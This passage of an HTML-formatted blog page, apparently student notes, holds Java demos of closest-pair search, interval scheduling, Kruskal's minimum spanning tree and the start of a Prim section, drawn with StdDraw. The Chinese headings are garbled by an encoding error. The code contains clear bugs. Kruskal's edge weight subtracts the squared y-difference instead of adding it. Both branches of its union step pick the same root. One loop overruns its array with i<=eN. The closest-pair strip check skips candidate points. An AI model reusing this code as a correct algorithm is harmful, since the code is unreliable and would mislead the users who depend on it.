class="hljs-keyword">if</span>(x[i]==x2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    pX[<span class="hljs-number">0</span>][i]=x2[j];<br>                    pX[<span class="hljs-number">1</span>][i]=y2[j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                }<br>                <span class="hljs-keyword">if</span> (y[i]==y2[j]&amp;&amp;flagY[j]==<span class="hljs-number">1</span>){<br>                    pY[<span class="hljs-number">0</span>][i]=x2[j];<br>                    pY[<span class="hljs-number">1</span>][i]=y2[j];<br>                    flagY[j]=<span class="hljs-number">0</span>;<br>                }<br>            }<br>        }<br>        ClosestPairRec(pX,pY,p2);<br>        System.out.println(p2[<span class="hljs-number">0</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">1</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">2</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">3</span>]);<br>        StdDraw.setPenColor(StdDraw.RED);<br>        StdDraw.line(p2[<span class="hljs-number">0</span>], p2[<span class="hljs-number">1</span>], p2[<span class="hljs-number">2</span>], p2[<span class="hljs-number">3</span>]);<br><br><br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ClosestPairRec</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] pX, <span class="hljs-type">int</span>[][] pY, <span class="hljs-type">int</span>[] p2)</span> {<br>        <span class="hljs-keyword">if</span>(pX[<span class="hljs-number">0</span>].length&lt;=<span class="hljs-number">3</span>){<br>            <span class="hljs-keyword">if</span> (pX[<span class="hljs-number">0</span>].length==<span class="hljs-number">3</span>){<br>                <span class="hljs-type">int</span> d1=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>                <span class="hljs-type">int</span> d2=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);<br>                <span class="hljs-type">int</span> d3=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);<br>                <span class="hljs-keyword">if</span>(d1&gt;=d2&amp;&amp;d1&gt;=d3){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>                }<br>                <span class="hljs-keyword">if</span>(d2&gt;=d1&amp;&amp;d2&gt;=d3){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>                }<br>                <span class="hljs-keyword">if</span>(d3&gt;=d1&amp;&amp;d3&gt;=d2){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>                }<br>            }<br>            <span class="hljs-keyword">if</span>(pX[<span class="hljs-number">0</span>].length==<span class="hljs-number">2</span>){<br>                p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>            }<br>            <span class="hljs-keyword">return</span>;<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">foreHalf</span> <span class="hljs-operator">=</span> pX[<span class="hljs-number">0</span>].length/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[][] qX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][foreHalf];<br>        <span class="hljs-type">int</span>[][] qY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][foreHalf];<br>        <span class="hljs-type">int</span>[][] rX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length-foreHalf];<br>        <span class="hljs-type">int</span>[][] rY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length-foreHalf];<br>        <span class="hljs-type">int</span>[] qp2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span>[] rp2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pX[<span class="hljs-number">0</span>].length;i++){<br>            <span class="hljs-keyword">if</span>(i&lt;foreHalf) {<br>                qX[<span class="hljs-number">0</span>][i] = pX[<span class="hljs-number">0</span>][i];<br>                qX[<span class="hljs-number">1</span>][i] = pX[<span class="hljs-number">1</span>][i];<br>                qY[<span class="hljs-number">0</span>][i] = pY[<span class="hljs-number">0</span>][i];<br>                qY[<span class="hljs-number">1</span>][i] = pY[<span class="hljs-number">1</span>][i];<br>            }<br>            <span class="hljs-keyword">else</span>{<br>                rX[<span class="hljs-number">0</span>][k] = pX[<span class="hljs-number">0</span>][i];<br>                rX[<span class="hljs-number">1</span>][k] = pX[<span class="hljs-number">1</span>][i];<br>                rY[<span class="hljs-number">0</span>][k] = pY[<span class="hljs-number">0</span>][i];<br>                rY[<span class="hljs-number">1</span>][k] = pY[<span class="hljs-number">1</span>][i];<br>                k=k+<span class="hljs-number">1</span>;<br>            }<br>        }<br><br>        ClosestPairRec(qX,qY,qp2);<br>        ClosestPairRec(rX,rY,rp2);<br>        <span class="hljs-type">int</span> dd1=(qp2[<span class="hljs-number">2</span>]-qp2[<span class="hljs-number">0</span>])* (qp2[<span class="hljs-number">2</span>]-qp2[<span class="hljs-number">0</span>])+(qp2[<span class="hljs-number">1</span>]-qp2[<span class="hljs-number">3</span>])* (qp2[<span class="hljs-number">1</span>]-qp2[<span class="hljs-number">3</span>]);<br>        <span class="hljs-type">int</span> dd2=(rp2[<span class="hljs-number">2</span>]-rp2[<span class="hljs-number">0</span>])* (rp2[<span class="hljs-number">2</span>]-rp2[<span class="hljs-number">0</span>])+(rp2[<span class="hljs-number">1</span>]-rp2[<span class="hljs-number">3</span>])* (rp2[<span class="hljs-number">1</span>]-rp2[<span class="hljs-number">3</span>]);<br>        <span class="hljs-type">int</span> d2=Math.min(dd2,dd1);<br>        <span class="hljs-type">double</span> d=Math.sqrt(d2);<br>        <span class="hljs-keyword">if</span> (dd1&lt;dd2){<br>            p2[<span class="hljs-number">0</span>]=qp2[<span class="hljs-number">0</span>];<br>            p2[<span class="hljs-number">1</span>]=qp2[<span class="hljs-number">1</span>];<br>            p2[<span class="hljs-number">2</span>]=qp2[<span class="hljs-number">2</span>];<br>            p2[<span class="hljs-number">3</span>]=qp2[<span class="hljs-number">3</span>];<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            p2[<span class="hljs-number">0</span>]=rp2[<span class="hljs-number">0</span>];<br>            p2[<span class="hljs-number">1</span>]=rp2[<span class="hljs-number">1</span>];<br>            p2[<span class="hljs-number">2</span>]=rp2[<span class="hljs-number">2</span>];<br>            p2[<span class="hljs-number">3</span>]=rp2[<span class="hljs-number">3</span>];<br>        }<br>        <span class="hljs-type">int</span>[][] sY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length];<br>        <span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pX[<span class="hljs-number">0</span>].length;i++){<br>            <span class="hljs-keyword">if</span>(pY[<span class="hljs-number">0</span>][i]&gt;(pX[<span class="hljs-number">0</span>][foreHalf-<span class="hljs-number">1</span>]-d)&amp;&amp;pY[<span class="hljs-number">0</span>][i]&lt;(pX[<span class="hljs-number">0</span>][foreHalf-<span class="hljs-number">1</span>]+d)){<br>                sY[<span class="hljs-number">0</span>][count]=pY[<span class="hljs-number">0</span>][i];<br>                sY[<span class="hljs-number">1</span>][count]=pY[<span class="hljs-number">1</span>][i];<br>                count=count+<span class="hljs-number">1</span>;<br>            }<br>        }<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;count;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">15</span>&amp;&amp;(j+<span class="hljs-number">1</span>)&lt;count;j++){<br>                <span class="hljs-type">int</span> dl=(sY[<span class="hljs-number">0</span>][i]-sY[<span class="hljs-number">0</span>][i+j])* (sY[<span class="hljs-number">0</span>][i]-sY[<span class="hljs-number">0</span>][i+j])+(sY[<span class="hljs-number">1</span>][i]-sY[<span class="hljs-number">1</span>][i+j])* (sY[<span class="hljs-number">1</span>][i]-sY[<span class="hljs-number">1</span>][i+j]);<br>                <span class="hljs-keyword">if</span>(dl&lt;d2){<br>                    d2=dl;<br>                    p2[<span class="hljs-number">0</span>]=sY[<span class="hljs-number">0</span>][i];<br>                    p2[<span class="hljs-number">1</span>]=sY[<span class="hljs-number">1</span>][i];<br>                    p2[<span class="hljs-number">2</span>]=sY[<span class="hljs-number">0</span>][i+j];<br>                    p2[<span class="hljs-number">3</span>]=sY[<span class="hljs-number">1</span>][i+j];<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="ç¬¬ä¸‰ç« "><a href="#ç¬¬ä¸‰ç« " class="headerlink" title="ç¬¬ä¸‰ç« "></a>ç¬¬ä¸‰ç« </h2><h3 id="æ—¶åºåˆ†é…"><a href="#æ—¶åºåˆ†é…" class="headerlink" title="æ—¶åºåˆ†é…"></a>æ—¶åºåˆ†é…</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntervarSchedulingDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IntervarSchedulingDemo</span><span class="hljs-params">()</span> {<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">isN</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">gis</span> <span class="hljs-operator">=</span> <span class="hljs-number">50</span>;<br>        <span class="hljs-type">int</span>[] isF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isF2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isR = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> gis;<br>        <span class="hljs-type">int</span>[] flagX = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-type">int</span> j;<br>        <span class="hljs-keyword">while</span>(c &lt; isN) {<br>            i = (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            j = (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d3</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            <span class="hljs-keyword">if</span> (i &gt; j) {<br>                isS[c] = j;<br>                isF[c] = i;<br>                isF2[c] = i;<br>                isY[c] = d3;<br>                isR[c] = <span class="hljs-number">1</span>;<br>                flagX[c] = <span class="hljs-number">1</span>;<br>                ++c;<br>            }<br>        }<br><br>        StdDraw.setXscale(<span class="hljs-number">0.0</span>, (<span class="hljs-type">double</span>)beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0.0</span>, (<span class="hljs-type">double</span>)beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        Arrays.sort(isF);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; isN; ++i) {<br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; isN; ++j) {<br>                <span class="hljs-keyword">if</span> (isF[i] == isF2[j] &amp;&amp; flagX[j] == <span class="hljs-number">1</span>) {<br>                    isS2[i] = isS[j];<br>                    isY2[i] = isY[j];<br>                    flagX[j] = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">for</span>(c = <span class="hljs-number">0</span>; c &lt; isN; ++c) {<br>            <span class="hljs-keyword">if</span> (isR[c] == <span class="hljs-number">1</span>) {<br>                <span class="hljs-keyword">for</span>(i = c + <span class="hljs-number">1</span>; i &lt; isN; ++i) {<br>                    <span class="hljs-keyword">if</span> (isS2[i] &lt; isF[c]) {<br>                        isR[i] = <span class="hljs-number">0</span>;<br>                    }<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; isN; ++i) {<br>            <span class="hljs-keyword">if</span> (isR[i] == <span class="hljs-number">1</span>) {<br>                StdDraw.setPenColor(StdDraw.RED);<br>                StdDraw.line((<span class="hljs-type">double</span>)isS2[i], (<span class="hljs-type">double</span>)isY2[i], (<span class="hljs-type">double</span>)isF[i], (<span class="hljs-type">double</span>)isY2[i]);<br>            } <span class="hljs-keyword">else</span> {<br>                StdDraw.setPenColor(StdDraw.BLACK);<br>                StdDraw.line((<span class="hljs-type">double</span>)isS2[i], (<span class="hljs-type">double</span>)isY2[i], (<span class="hljs-type">double</span>)isF[i], (<span class="hljs-type">double</span>)isY2[i]);<br>            }<br>        }<br><br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure><h3 id="æœ€å°ç”Ÿæˆæ ‘"><a href="#æœ€å°ç”Ÿæˆæ ‘" class="headerlink" title="æœ€å°ç”Ÿæˆæ ‘"></a>æœ€å°ç”Ÿæˆæ ‘</h3><h4 id="kru"><a href="#kru" class="headerlink" title="kru"></a>kru</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KruskalDemo2</span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] arrays)</span>{<br>        <span class="hljs-type">int</span> VN=<span class="hljs-number">9</span>,eN=<span class="hljs-number">17</span>,count;<br>        count=VN;<br>        <span class="hljs-type">int</span>[] cN=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[VN];<br>        <span class="hljs-type">int</span>[] cS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[VN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;VN;i++){<br>            cN[i]=i;<br>            cS[i]=<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[] c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] c2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[][]<br>                e={{<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>},{<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span> N=VN;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x={<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++)<br>        {<br>            v3=e[<span class="hljs-number">0</span>][i];<br>            v4=e[<span class="hljs-number">1</span>][i];<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])-(y[v3]-y[v4])*(y[v3]-y[v4]);<br>            c2[i]=c[i];<br>            flagEOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;eN;j++){<br>                <span class="hljs-keyword">if</span>(c[i]==c2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    e2[<span class="hljs-number">0</span>][i]=e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i]=e[<span class="hljs-number">1</span>][j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> clb=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (count&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">if</span> (count==<span class="hljs-number">1</span>){<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=eN;i++){<br>                    <span class="hljs-type">int</span> v1,v2;<br>                    v1=e2[<span class="hljs-number">0</span>][i];<br>                    v2=e2[<span class="hljs-number">1</span>][i];<br>                    <span class="hljs-keyword">if</span>(flagEOG[i]==<span class="hljs-number">1</span>){<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                    <span class="hljs-keyword">else</span>{<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> szj1,szj2;<br>            szj1=cN[e2[<span class="hljs-number">0</span>][clb]];<br>            szj2=cN[e2[<span class="hljs-number">1</span>][clb]];<br>            <span class="hljs-keyword">if</span>(szj1!=szj2){<br>                flagEOG[clb]=<span class="hljs-number">1</span>;<br>                count=count-<span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> dd,xd;<br>                <span class="hljs-keyword">if</span> (cS[szj1]&gt;=cS[szj2]){<br>                    dd=szj1;<br>                    xd=szj2;<br>                }<br>                <span class="hljs-keyword">else</span> {<br>                    dd=szj1;<br>                    xd=szj2;<br>                }<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;VN;k++){<br>                    <span class="hljs-keyword">if</span>(cN[k]==dd){<br>                        cS[dd]=cS[dd]+cS[xd];<br>                    }<br>                }<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;VN;k++){<br>                    <span class="hljs-keyword">if</span>(cN[k]==xd){<br>                        cN[k]=dd;<br>                    }<br>                }<br>            }<br>            clb=clb+<span class="hljs-number">1</span>;<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="prim"><a href="#prim" class="headerlink" title="prim"></a>prim</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 